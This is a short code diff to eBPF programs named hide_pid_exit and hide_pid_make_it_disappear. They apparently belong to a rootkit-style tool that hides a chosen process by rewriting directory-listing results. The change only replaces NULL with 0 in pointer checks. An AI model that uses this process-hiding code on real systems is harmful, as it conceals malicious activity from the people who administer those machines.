@@ -87,12 +87,12 @@ int hide_pid_exit(struct trace_event_raw_sys_exit *ctx)
 
     size_t pid_tgid = bpf_get_current_pid_tgid();
     long unsigned int *pbuff_addr = bpf_map_lookup_elem(&dirent_maps, &pid_tgid);
-    if (pbuff_addr == NULL)
+    if (pbuff_addr == 0)
         return 0;
     long unsigned int buff_addr = *pbuff_addr;
     unsigned int bpos = 0;
     unsigned int *bpos_ptr = bpf_map_lookup_elem(&dirent_offset, &pid_tgid);
-    if (bpos_ptr != NULL) {
+    if (bpos_ptr != 0) {
         bpos = *bpos_ptr;
     }
     // We are going to loop through until we find the name of folder we want to hide
@@ -154,7 +154,7 @@ int hide_pid_make_it_disappear(struct trace_event_raw_sys_exit *ctx)
         return 0;
     }
     unsigned int *bpos_ptr = bpf_map_lookup_elem(&dirent_offset, &pid_tgid);
-    if (bpos_ptr != NULL) {
+    if (bpos_ptr != 0) {
         bpos = *bpos_ptr;
     }
 
